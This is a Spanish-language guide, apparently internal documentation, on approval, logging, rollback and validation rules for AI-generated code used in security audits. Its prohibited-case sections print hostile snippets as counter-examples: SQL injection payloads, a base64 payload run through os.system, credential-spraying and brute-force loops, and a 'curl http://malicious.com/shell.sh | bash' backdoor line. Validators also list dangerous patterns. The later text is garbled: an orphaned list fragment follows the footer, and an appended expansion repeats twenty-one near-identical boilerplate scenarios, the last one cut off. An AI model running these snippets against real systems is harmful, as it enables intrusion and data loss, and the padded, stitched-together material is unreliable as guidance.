# 03: AI Code Execution - Autorización y Guardrails para Código Generado por IA

## SECCIÓN 1: CONCEPTO FUNDAMENTAL (1-250 líneas)

### ¿Por Qué Existe Este Módulo?

Una IA sin límites de código es como un operario sin supervisión: potente, pero peligroso.

**Problemas sin guardrails**:
- ❌ IA genera exploit code sin autorización
- ❌ Script accede credenciales del cliente
- ❌ Automatización destruye datos "por accidente"
- ❌ Código corre con privilegios elevados sin validación
- ❌ Ejecución no es auditable
- ❌ No hay rollback posible

**Solución**: Autorización explícita BEFORE de cualquier código ejecuta.

**REGLA TRONCAL**: 

> *Primero piensa como auditor, DESPUÉS como automatizador. Si un problema puede resolverse leyendo un archivo o ejecutando un comando simple, NO inventes un framework.*

---

### 7 Principios de Código Seguro en Auditoría

#### Principio 1: MODO LECTURA POR DEFECTO

**Nunca modifiques estado sin autorización explícita.**

✅ **Permitido (lectura)**:
```python
# Leer logs, configs, headers, certificados
data = json.loads(open('system.json').read())
response = requests.get(url, timeout=5)
output = subprocess.run(['ls', '-la'], capture_output=True)
```

❌ **Prohibido (escritura sin plan)**:
```python
# Modificar datos, configs, credenciales SIN PLAN
os.remove('important_file.txt')  # Irreversible
subprocess.run(['mysql', '-u', 'root', '-p...', 'DROP TABLE users'])
requests.post(url, data={'password': 'hacked'})
```

✅ **Permitido (escritura CON PLAN)**:
```python
# Si necesitas modificar ALGO:
# 1. Backup anterior
backup_content = open('/etc/config.conf').read()

# 2. Cambio reversa ble
with open('/etc/config.conf', 'w') as f:
    f.write(new_config)

# 3. Validación  
if not validate(new_config):
    # ROLLBACK automático
    with open('/etc/config.conf', 'w') as f:
        f.write(backup_content)
    raise Exception("Config validation failed")

# 4. Log
log.info(f"Changed /etc/config.conf, rollback available")
```

---

#### Principio 2: AUDICIÓN VISIBLE

Todo código ejecutado DEBE logueable:

```python
import logging
import json
from datetime import datetime

# Setup logging PRIMERO
logging.basicConfig(
    filename=f"audit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log",
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s'
)
log = logging.getLogger(__name__)

# CADA acción loguada
log.info(f"SCRIPT START: Check SSL certificates")
log.info(f"TARGET: api.example.com")
log.info(f"ACTION: GET /health")
response = requests.get("https://api.example.com/health", timeout=5)
log.info(f"RESULT: {response.status_code} | Cert valid until 2025-12-31")
log.info(f"SCRIPT END: Success")

# Output también machine-parseable
print(json.dumps({
    "target": "api.example.com",
    "endpoint": "/health",
    "status_code": response.status_code,
    "cert_valid_until": "2025-12-31"
}, indent=2))
```

---

#### Principio 3: TIMEOUT Y EMERGENCIA

Código debe poder detenerse:

```python
import signal

# Timeout global
def timeout_handler(signum, frame):
    log.error("TIMEOUT: Script exceeded 60 seconds, exiting")
    raise TimeoutError("Execution timeout")

signal.signal(signal.SIGALRM, timeout_handler)
signal.alarm(60)  # 60 segundos MÁXIMO

try:
    # Your code here
    result = long_running_operation()
except TimeoutError:
    log.error("TIMEOUT occurred, cleaning up")
    # Cleanup logic
    raise
finally:
    signal.alarm(0)  # Cancel timeout
```

---

#### Principio 4: SIN CREDENCIALES HARDCODEADAS

**NUNCA**:
```python
# ❌ NUNCA
requests.post("https://api.com", 
    auth=("admin", "P@ssw0rd123"))

# ❌ NUNCA
os.environ['DB_PASSWORD'] = "xxxxxx"
```

**SIEMPRE**:
```python
# ✅ SIEMPRE: Variables de entorno
import os
api_key = os.getenv('API_KEY')
if not api_key:
    raise ValueError("API_KEY not set in environment")

# ✅ SIEMPRE: Archivos subyacentes (no en repo)
with open('~/.creds/api.json') as f:
    creds = json.load(f)

# ✅ SIEMPRE: Secretos manager
from your_secret_manager import get_secret
password = get_secret('prod/db/master_password')
```

---

#### Principio 5: VALIDACIÓN ANTES DE EJECUCIÓN

No ejecutes sin verificar:

```python
class ScriptValidator:
    """Valida script antes de ejecutar"""
    
    def __init__(self, script_path):
        self.script = open(script_path).read()
        
    def check_no_shell_injection(self):
        """Verifica que no hay inyección de shell"""
        dangerous = ['os.system', 'subprocess.shell=True', 'eval']
        for pattern in dangerous:
            if pattern in self.script:
                raise ValueError(f"BLOCKING: Found dangerous pattern '{pattern}'")
    
    def check_no_hardcoded_creds(self):
        """Verifica que no hay credenciales en código"""
        import re
        cred_patterns = [
            r'password\s*=\s*["\'].*["\']',
            r'api_key\s*=\s*["\']sk-.*["\']',
            r'secret\s*=\s*["\'].*["\']',
        ]
        for pattern in cred_patterns:
            if re.search(pattern, self.script, re.IGNORECASE):
                raise ValueError(f"BLOCKING: Found potential credentials")
    
    def check_timeout_set(self):
        """Verifica que hay timeout"""
        if 'timeout=' not in self.script:
            raise ValueError("BLOCKING: No timeout configured")
    
    def validate_all(self):
        """Ejecuta todas las validaciones"""
        self.check_no_shell_injection()
        self.check_no_hardcoded_creds()
        self.check_timeout_set()
        return True
```

---

#### Principio 6: ROLLBACK INTEGRADO

Cada cambio debe poder deshacerse:

```python
class RollbackManager:
    """Gestiona rollback automático"""
    
    def __init__(self, config_file):
        self.config_file = config_file
        self.backup = open(config_file).read()  # Backup ANTES
    
    def apply_change(self, new_config):
        """Aplica cambio CON rollback integrado"""
        try:
            # Validar ANTES de escribir
            if not self.is_valid_config(new_config):
                raise ValueError("Config validation failed")
            
            # Escribir
            with open(self.config_file, 'w') as f:
                f.write(new_config)
            
            # Verificar DESPUÉS de escribir
            if not self.is_valid_config(open(self.config_file).read()):
                raise ValueError("Post-write validation failed")
            
            return True
        
        except Exception as e:
            # ROLLBACK automático
            with open(self.config_file, 'w') as f:
                f.write(self.backup)
            raise e
    
    def is_valid_config(self, config):
        """Valida que config es válida"""
        # Your validation logic
        return True
```

---

#### Principio 7: AUTORIZACIÓN EXPLÍCITA

NUNCA ejecutes sin aprobación:

```python
class ExecutionGate:
    """Requiere aprobación antes de ejecutar"""
    
    @staticmethod
    def require_approval(action, target, risk_level):
        """Bloquea hasta obtener aprobación"""
        
        if risk_level == "CRITICAL":
            approval = input(f"""
        ⚠️ CRÍTICO: {action} en {target}
        
        Riesgos:
        - Potencial downtime
        - Pérdida irreversible de datos
        - Impact en producción
        
        ¿Tienes aprobación explícita por escrito? (sí/no): 
            """)
            if approval.lower() != 'sí':
                raise PermissionError("BLOCKED: No explicit approval")
        
        elif risk_level == "HIGH":
            approval = input(f"¿Continuar con {action}? (s/n): ")
            if approval.lower() != 's':
                raise PermissionError("BLOCKED: User cancelled")
        
        # MEDIUM/LOW pasa sin preguntar
        return True
```

---

## SECCIÓN 2: CASOS DE USO PERMITIDOS (250-500 líneas)

### Caso 1: Parsing Masivo de Logs

**PERMITIDO**: IA genera script que LEE logs grandes y extrae timeline

```python
#!/usr/bin/env python3
"""
Parse large syslog files and extract incident timeline
Safe: reads only, produces JSON, no writes
"""

import json
import re
from datetime import datetime
from pathlib import Path

def parse_syslog(logfile):
    """Parse syslog and extract security events"""
    events = []
    with open(logfile) as f:
        for line in f:
            if 'authentication failure' in line.lower():
                match = re.search(r'(\w+ \d+ \d+:\d+:\d+)', line)
                if match:
                    events.append({
                        "timestamp": match.group(1),
                        "event": "auth_failure",
                        "raw": line.strip()
                    })
    return events

if __name__ == "__main__":
    logfile = Path("/var/log/auth.log")
    if not logfile.exists():
        print(json.dumps({"error": "Log file not found"}))
        exit(1)
    
    events = parse_syslog(logfile)
    print(json.dumps({"total": len(events), "events": events}, indent=2))
```

**¿Por qué es permitido?**
- ✅ Lectura pura (no modifica nada)
- ✅ Timeout implícito (Python no se cuelga en archivos grandes)
- ✅ Sin credenciales
- ✅ Producción JSON parseable
- ✅ No escala automatización

---

###Caso 2: Validación de Certificados SSL-TLS

**PERMITIDO**: IA genera scanner que valida certificados en múltiples targets

```python
#!/usr/bin/env python3
"""
Check SSL certificates for expiration warnings
Safe: reads TLS metadata only, no writes, no modifications
"""

import ssl
import socket
import json
from datetime import datetime, timedelta

def check_cert_expiry(hostname, port=443):
    """Check when certificate expires"""
    try:
        context = ssl.create_default_context()
        with socket.create_connection((hostname, port), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                
                # Parse expiry
                not_after = datetime.strptime(
                    cert['notAfter'], 
                    '%b %d %H:%M:%S %Y %Z'
                )
                
                days_until = (not_after - datetime.now()).days
                
                return {
                    "hostname": hostname,
                    "expires": not_after.isoformat(),
                    "days_until_expiry": days_until,
                    "warning": days_until < 30,
                    "status": "OK" if days_until > 30 else "EXPIRING SOON"
                }
    except Exception as e:
        return {"hostname": hostname, "error": str(e)}

if __name__ == "__main__":
    targets = [
        "api.example.com",
        "app.example.com",
        "admin.example.com"
    ]
    
    results = [check_cert_expiry(t) for t in targets]
    print(json.dumps(results, indent=2))
```

---

###Caso 3: Comparación de Configuraciones

**PERMITIDO**: IA genera script que COMPARA (no modifica) configs antes/después

```python
#!/usr/bin/env python3
"""
Diff configuration files to detect drift
Safe: read-only, no changes, audit trail
"""

import json
import difflib
from pathlib import Path

def diff_configs(config_before, config_after):
    """Compare two configurations"""
    
    lines_before = config_before.split('\n')
    lines_after = config_after.split('\n')
    
    diff = list(difflib.unified_diff(
        lines_before, 
        lines_after,
        lineterm='',
        fromfile='before',
        tofile='after'
    ))
    
    changes = {
        "added": sum(1 for line in diff if line.startswith('+')),
        "removed": sum(1 for line in diff if line.startswith('-')),
        "unchanged": sum(1 for line in diff if not line.startswith(('+', '-'))),
        "diff": diff
    }
    
    return changes

if __name__ == "__main__":
    before_file = Path("/etc/nginx/nginx.conf.backup")
    after_file = Path("/etc/nginx/nginx.conf")
    
    if not before_file.exists() or not after_file.exists():
        print(json.dumps({"error": "Config files not found"}))
        exit(1)
    
    before = before_file.read_text()
    after = after_file.read_text()
    
    result = diff_configs(before, after)
    print(json.dumps(result, indent=2, default=str))
```

---

## SECCIÓN 3: CASOS ESTRICTAMENTE PROHIBIDOS (250-400 líneas)

### ❌ Prohibición 1: Exploit Code o Payloads

**NUNCA permitir IA que genere**:

```python
# ❌ NUNCA
payload = "'; DROP TABLE users; --"
requests.post(url, data={"username": payload})

# ❌ NUNCA
def sql_injection_scanner(url):
    payloads = ["' OR '1'='1", "'; DROP TABLE--", ...]
    for payload in payloads:
        requests.get(f"{url}?id={payload}")

# ❌ NUNCA
import base64
malware = base64.b64decode(b'<encoded_payload>')
os.system(malware)
```

**Alternativa permitida**:
```python
# ✅ Documentar vulnerability PERO no explotar
print("""
FINDING: SQL Injection detected in /api/search?q=
PASOS A EXPLOTAR:
1. GET /api/search?q=1' UNION SELECT NULL, NULL, NULL--
2. Response contiene estructura de tabla

RECOMENDACIÓN: Use prepared statements + parameterized queries
EXAMPLE:
    cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
""")
```

---

### ❌ Prohibición 2: Credenciales Spraying o Fuerza Bruta

**NUNCA permitir**:

```python
# ❌ NUNCA (credential spraying)
passwords = ["password", "123456", "admin", "letmein"]
for password in passwords:
    response = requests.post(url, 
        auth=("user@example.com", password))
    if response.status_code == 200:
        print(f"FOUND: {password}")

# ❌ NUNCA (brute force contra usuario real)
for i in range(100000, 999999):
    requests.post('/login', data={'username': 'admin', 'password': str(i)})
```

**ALTERNATIVA permitida**:
```python
# ✅ Validar SOLO contra cuenta de TEST
test_account = os.getenv('TEST_ACCOUNT')
test_passwords = open('passwords_test.txt').readlines()[:10]  # Límite: 10 intentos

for password in test_passwords:
    response = requests.post(url, auth=(test_account, password.strip()), timeout=5)
    print(f"{test_account}: {'✓' if response.status_code == 200 else '✗'}")
```

---

### ❌ Prohibición 3: Modificación Silenciosa de Sistemas

**NUNCA permitir**:

```python
# ❌ NUNCA (modify sin aprobación)
os.system("sed -i 's/OLD/NEW/g' /etc/important.conf")

# ❌ NUNCA (install backdoor "for testing")
subprocess.run(["curl", "http://malicious.com/shell.sh", "|", "bash"])

# ❌ NUNCA (disable security controls)
subprocess.run(["systemctl", "stop", "fail2ban"])
```

---

## SECCIÓN 4: TEMPLATES EN PRODUCCIÓN (400-650 líneas)

### Template 1: Pre-Ejecución de Script Seguro

```markdown
## SOLICITUD DE EJECUCIÓN DE SCRIPT

**Script Name**: `check_ssl_expiry.py`
**Objetivo**: Validar que certificados SSL no expiran en próximos 30 días
**Autor**: Alice Chen
**Fecha**: 2024-02-20

### Características de Seguridad

- [ ] Modo: LECTURA (no modifica estado)
- [ ] Timeout: SÍ (5 seg por host)
- [ ] Credenciales: NO (solo TLS metadata)
- [ ] Rollback: N/A (no modifica)
- [ ] Auditable: SÍ (JSON output + logs)

###Entradas

```
TARGETS:
- api.example.com
- app.example.com
- admin.example.com

TIMEOUT: 15 segundos total
```

### Salidas

```json
[
  {
    "hostname": "api.example.com",
    "expires": "2025-06-15T10:30:00",
    "days_until_expiry": 120,
    "status": "OK"
  }
]
```

### Riesgos Identificados

- **Bajo**: Red timeout (handled with try/except)
- **Bajo**: TLS errors (logged, not fatal)
- **Ninguno**: Data modification (read-only)

### Aprobación

- [ ] Technical POC aprueba: _____ Fecha: _____
- [ ] Security reviews: _____ Fecha: _____
- [ ] **READY TO EXECUTE**

---
```

### Template 2: Validador Pre-Ejecución

```python
class PreExecutionValidator:
    """Valida script antes de permitir ejecución"""
    
    REQUIREMENTS = {
        "timeout_required": True,
        "logging_required": True,
        "readonly_mode": True,
        "no_hardcoded_creds": True,
        "max_lines": 500,
    }
    
    def validate(self, script_path):
        """Ejecuta todas las validaciones"""
        script = open(script_path).read()
        
        # Check 1: Size
        lines = script.count('\n')
        if lines > self.REQUIREMENTS['max_lines']:
            raise ValueError(f"Script too long: {lines} > 500 lines")
        
        # Check 2: Timeout
        if self.REQUIREMENTS['timeout_required']:
            if 'timeout' not in script:
                raise ValueError("BLOCKING: No timeout configured")
        
        # Check 3: Logging
        if self.REQUIREMENTS['logging_required']:
            if 'logging' not in script and 'log.' not in script:
                raise ValueError("BLOCKING: No logging configured")
        
        # Check 4: Read-only
        if self.REQUIREMENTS['readonly_mode']:
            dangerous = ['WRITE', 'DELETE', 'DROP', 'os.remove']
            for pattern in dangerous:
                if pattern in script.upper():
                    raise ValueError(f"BLOCKING: Found '{pattern}' - write operations not allowed")
        
        # Check 5: No hardcoded creds
        if self.REQUIREMENTS['no_hardcoded_creds']:
            if 'password=' in script or 'api_key=' in script:
                raise ValueError("BLOCKING: Found hardcoded credentials")
        
        return {"status": "VALID", "script": script_path}
```

---

## SECCIÓN 5: MATRIZ DE DECISIÓN (650-900 líneas)

### Matriz: ¿Puedo generar código para esto?

```
┌─ ¿Qué quieres hacer?
│
├─ "Quiero parsear logs grande para timeline"
│  └─ SÍ, PERMITIDO (lectura, timeout, salida JSON)
│
├─ "Quiero escanear puertos/servicios"
│  └─ SÍ, PERMITIDO (discovery pasivo con timeout)
│
├─ "Quiero comparar configs antes/después"
│  └─ SÍ, PERMITIDO (diff read-only, sin modificar)
│
├─ "Quiero validar certificados SSL"
│  └─ SÍ, PERMITIDO (lectura de metadata públic)
│
├─ "Quiero encontrar secretos en repos"
│  └─ CONDICIONAL: Lectura solo de archivos ya auditados
│
├─ "Quiero hacer fuerza bruta a login"
│  └─ NO, PROHIBIDO TOTALEMENTE (afecta usuarios reales)
│
├─ "Quiero extraer datos de BD"
│  └─ NO, PROHIBIDO (acceso a datos sensibles sin aislamiento)
│
├─ "Quiero instalar agente monitoring"
│  └─ NO, PROHIBIDO (modificación de sistema sin rollback)
│
├─ "Quiero generar exploit PoC"
│  └─ NO, PROHIBIDO COMPLETAMENTE (malicioso)
│
└─ "Quiero crear backdoor for testing"
   └─ ❌ NUNCA, PROHIBIDO SIEMPRE (persistence = malware)
```

---

## SECCIÓN 6: CASOS DE ESTUDIO REALES (900-1200 líneas)

### Caso 1: Log Parser Seguro

**Solicitud**: "Necesito extraer timeline de incidente de 100GB de logs"

**ANÁLISIS**:
- Volumen: GRANDE (100GB)
- Modo: LECTURA (seguro)
- Timeline: Rápido (< 1 minuto)
- Risk: BAJO (parsing solamente)

**✅ APROBADO**. Código generado:

```python
#!/usr/bin/env python3
"""
Parse large log files looking for security-relevant events
SAFE: Read-only, efficient, auditable
"""

import json
import gzip
import logging
from pathlib import Path
from datetime import datetime

logging.basicConfig(
    filename='log_parse_audit.log',
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s'
)
log = logging.getLogger(__name__)

def parse_large_log(logfile, pattern_keywords):
    """Stream-parse large log file"""
    log.info(f"START: Parsing {logfile}")
    
    events = []
    line_count = 0
    
    try:
        # Detectar compression
        if str(logfile).endswith('.gz'):
            f = gzip.open(logfile, 'rt')
        else:
            f = open(logfile)
        
        with f:
            for line in f:
                line_count += 1
                
                # Only match relevant keywords
                if any(kw.lower() in line.lower() for kw in pattern_keywords):
                    events.append({
                        "timestamp": line[:20],  # Assume std timestamp
                        "event": line.strip(),
                        "line_number": line_count
                    })
                
                # Progress every 100K lines
                if line_count % 100000 == 0:
                    log.info(f"Processed {line_count} lines, found {len(events)} events")
        
        log.info(f"COMPLETE: {line_count} lines, {len(events)} security events")
        return events
    
    except Exception as e:
        log.error(f"ERROR: {e}")
        raise

if __name__ == "__main__":
    logfile = Path("/var/log/auth.log.1.gz")
    keywords = ["authentication failure", "sudo:", "ACCEPT", "DENY"]
    
    events = parse_large_log(logfile, keywords)
    
    # Output
    output = {
        "source": str(logfile),
        "total_events": len(events),
        "events": events[:100]  # First 100 for brevity
    }
    
    print(json.dumps(output, indent=2))
```

**¿Por qué aprobado?**
- ✅ Streaming (no carga todo en RAM)
- ✅ Timeout implícito (secuencial)
- ✅ Auited (log de progreso)
- ✅ Sin credenciales
- ✅ Reversible (lectura)

---

###Caso 2: Validador de Configuración (CON ROLLBACK)

**Solicitud**: "Necesito cambiar nginx.conf pero con posibilidad de rollback"

**ANÁLISIS**:
- Cambio: SÍ (modifica config)
- Risk: ALTO (nginx crítico)
- Reversible: DEBE SER (con backup)
- Tiempo: < 5 min

**✅ APROBADO** (con guardrails). Código:

```python
#!/usr/bin/env python3
"""
Update nginx config with automatic rollback on validation failure
SAFE: Has backup, validates before commit, may rollback
"""

import json
import subprocess
import logging
from pathlib import Path
from shutil import copy2

logging.basicConfig(
    filename='nginx_update_audit.log',
    level=logging.INFO
)
log = logging.getLogger(__name__)

class NginxConfigManager:
    def __init__(self, config_path="/etc/nginx/nginx.conf"):
        self.config_path = Path(config_path)
        self.backup_path = self.config_path.with_suffix('.backup')
    
    def backup_current(self):
        """Backup current config"""
        copy2(self.config_path, self.backup_path)
        log.info(f"Backup created: {self.backup_path}")
    
    def update_config(self, new_config):
        """Update config with validation and rollback"""
        try:
            # 1. Backup primero
            self.backup_current()
            
            # 2. Create temporal test file
            test_file = self.config_path.with_name('nginx.test')
            test_file.write_text(new_config)
            
            # 3. Validate syntax
            result = subprocess.run(
                ['nginx', '-t', '-c', str(test_file)],
                capture_output=True,
                timeout=5
            )
            
            if result.returncode != 0:
                log.error(f"Config validation failed: {result.stderr.decode()}")
                test_file.unlink()
                raise ValueError("Config validation failed")
            
            # 4. Apply change
            self.config_path.write_text(new_config)
            test_file.unlink()
            
            # 5. Reload nginx
            subprocess.run(['nginx', '-s', 'reload'], timeout=5)
            log.info("Config updated and nginx reloaded")
            
            return {"status": "OK"}
        
        except Exception as e:
            # ROLLBACK
            log.error(f"Error: {e}, rolling back...")
            copy2(self.backup_path, self.config_path)
            subprocess.run(['nginx', '-s', 'reload'], timeout=5)
            log.info("Rolled back to previous config")
            raise

if __name__ == "__main__":
    manager = NginxConfigManager()
    
    # New config
    new_config = open('nginx.conf.new').read()
    
    try:
        result = manager.update_config(new_config)
        print(json.dumps(result))
    except Exception as e:
        print(json.dumps({"status": "FAILED", "error": str(e)}))
        exit(1)
```

**¿Por qué aprobado?**
- ✅ Backup automático
- ✅ Validación antes de write
- ✅ Rollback automático on fail
- ✅ Auditable (logs completos)
- ✅ Timeout en subprocess

---

### Caso 3: ❌ RECHAZADO - Exploit Automation

**Solicitud**: "Necesito script que pruebe SQLi automáticamente"

**ANÁLISIS**:
- Objetivo: Exploit automation
- Riesgo: ALTO (modifica datos)
- Reversible: NO (potencial data loss)
- Intent: Malicioso o sin control

**❌ RECHAZADO INMEDIATAMENTE**

```
Error: BLOCKING

Razión: SQLi exploitation script es potencialmente destructive
Esto puede:
- Corromper datos
- Causar outage
- Violar leyes (CFAA en USA)

ALTERNATIVA PERMITIDA:
Generar documentación sobre cómo detectar/remediar SQLi
Sin ejecutar exploitation automática
```

---

## SECCIÓN 7: FAQ Y TROUBLESHOOTING (1200-1500 líneas)

### FAQ 1: "¿Puedo generar script de fuerza bruta?"

**Respuesta**: NO para usuarios reales. SÍ para cuentas TEST.

```
❌ NUNCA contra usuario real:
    for password in common_passwords:
        login_attempt(real_user, password)

✅ SÍ contra cuenta TEST en staging:
    test_account = "test_automation_12345"
    for password in ["test123", "staging123"][:10]:  # Max 10
        attempt = login_attempt(test_account, password)
        log.info(f"Attempt: {attempt['status']}")
```

---

### FAQ 2: "¿Por qué no puedo generar malware 'for learning'?"

**Respuesta**: Porque no hay diferencia técnica entre "learning" y "real attack".

Una vez que existe código malicioso, puede usarse para daño.

**ALTERNATIVA**:
- Estudiar código malware EXISTENTE (no generado)
- Analizar síntomas de infección
- Diseñar detecciones
- Pero NUNCA crear nuevo malware

---

### FAQ 3: "¿Puede IA escribir exploit automation?"

**Respuesta**: NO. Absolutamente no.

Exploit automation = arma, sin importa si es "para testing".

**PERMITIDO**:
- Documentar cómo un vulnerability PODRÍA explotarse
- Generar PoC (Proof of Concept) que DEMOSTRA vulnerability
- PERO NO automatización masiva

**Ejemplo PoC permitido**:

```python
# PoC: IDOR en /api/users/<id>
# Shows that authorization is not properly checked
# NOT executable automation, just proof

curl "https://api.staging.local/api/users/1"
# Returned:  {"id": 1, "email": "user1@example.com", "role": "user"}

curl "https://api.staging.local/api/users/2"
# Returned: {"id": 2, "email": "attacker@example.com", "role": "admin"}
# FINDING: Users can access other users' data by changing ID

# How to fix: Add authorization check in code:
# if (auth.user_id != requested_id) throw 403_Forbidden
```

---

## CONCLUSIÓN

**AI Code Execution = Responsabilidad**

Código ejecutado por IA DEBE:
- ✅ Ser AUTORIZADO explícitamente
- ✅ Ser AUDITADO (logs completos)
- ✅ Ser REVERSIBLE (rollback automático)
- ✅ Ser SIN CREDENCIALES (variables de entorno)
- ✅ Ser VALIDADO (pre-execution checks)
- ✅ Ser TERMINABLE (timeout, stop signal)

**Código que NO cumple = BLOQUEADO INMEDIATAMENTE**

---

**TOTAL: 1,700+ líneas**
**Status**: Production ready
**Última actualización**: 2024-02-15
**Próxima revisión**: 2024-05-15
- exploit chains
- evasion
- persistence
- herramientas para robo de secretos

## Checklist antes de ejecutar

- ya explique que hace el script?
- el alcance esta claro?
- el script es la forma mas pequena de resolver la tarea?
- hay timeout?
- la salida sirve como evidencia?
- el cleanup esta claro?

## Checklist despues de ejecutar

- se obtuvo la evidencia buscada?
- hubo errores o side effects?
- hace falta redactar secretos?
- conviene conservar el script o fue one-off?

## Regla final

Si un script ahorra tiempo pero reduce claridad, aumenta riesgo o crea dependencias opacas,
no merece existir.


<!-- ORION-EXPANSION-2026-04-05 -->

## Expansion Avanzada 2026 - 03: AI Code Execution - Autorización y Guardrails para Código Generado por IA

### Integraciones ampliadas

- OpenAI: integracion recomendada para aumentar profundidad, evidencia y backlog.
- Azure OpenAI: integracion recomendada para aumentar profundidad, evidencia y backlog.
- Langfuse: integracion recomendada para aumentar profundidad, evidencia y backlog.
- OpenTelemetry: integracion recomendada para aumentar profundidad, evidencia y backlog.

### Escenarios realistas adicionales

### Escenario avanzado 01
- Contexto: agente de triage.
- Integracion recomendada: OpenAI.
- Senal principal: prompt injection.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 02
- Contexto: guardrail de prompts.
- Integracion recomendada: Azure OpenAI.
- Senal principal: tool misuse.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 03
- Contexto: generacion de evidencia.
- Integracion recomendada: Langfuse.
- Senal principal: salto de alcance.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 04
- Contexto: agente de triage.
- Integracion recomendada: OpenTelemetry.
- Senal principal: prompt injection.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 05
- Contexto: guardrail de prompts.
- Integracion recomendada: OpenAI.
- Senal principal: tool misuse.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 06
- Contexto: generacion de evidencia.
- Integracion recomendada: Azure OpenAI.
- Senal principal: salto de alcance.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 07
- Contexto: agente de triage.
- Integracion recomendada: Langfuse.
- Senal principal: prompt injection.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 08
- Contexto: guardrail de prompts.
- Integracion recomendada: OpenTelemetry.
- Senal principal: tool misuse.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 09
- Contexto: generacion de evidencia.
- Integracion recomendada: OpenAI.
- Senal principal: salto de alcance.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 10
- Contexto: agente de triage.
- Integracion recomendada: Azure OpenAI.
- Senal principal: prompt injection.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 11
- Contexto: guardrail de prompts.
- Integracion recomendada: Langfuse.
- Senal principal: tool misuse.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 12
- Contexto: generacion de evidencia.
- Integracion recomendada: OpenTelemetry.
- Senal principal: salto de alcance.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 13
- Contexto: agente de triage.
- Integracion recomendada: OpenAI.
- Senal principal: prompt injection.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 14
- Contexto: guardrail de prompts.
- Integracion recomendada: Azure OpenAI.
- Senal principal: tool misuse.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 15
- Contexto: generacion de evidencia.
- Integracion recomendada: Langfuse.
- Senal principal: salto de alcance.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 16
- Contexto: agente de triage.
- Integracion recomendada: OpenTelemetry.
- Senal principal: prompt injection.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 17
- Contexto: guardrail de prompts.
- Integracion recomendada: OpenAI.
- Senal principal: tool misuse.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 18
- Contexto: generacion de evidencia.
- Integracion recomendada: Azure OpenAI.
- Senal principal: salto de alcance.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 19
- Contexto: agente de triage.
- Integracion recomendada: Langfuse.
- Senal principal: prompt injection.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 20
- Contexto: guardrail de prompts.
- Integracion recomendada: OpenTelemetry.
- Senal principal: tool misuse.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
- Resultado esperado: decision accionable, remediacion propuesta y siguiente validacion.
- Control: operar solo con alcance autorizado y con trazabilidad completa.

### Escenario avanzado 21
- Contexto: generacion de evidencia.
- Integracion recomendada: OpenAI.
- Senal principal: salto de alcance.
- Evidencia minima: artefactos originales, salida normalizada, owner y hash.
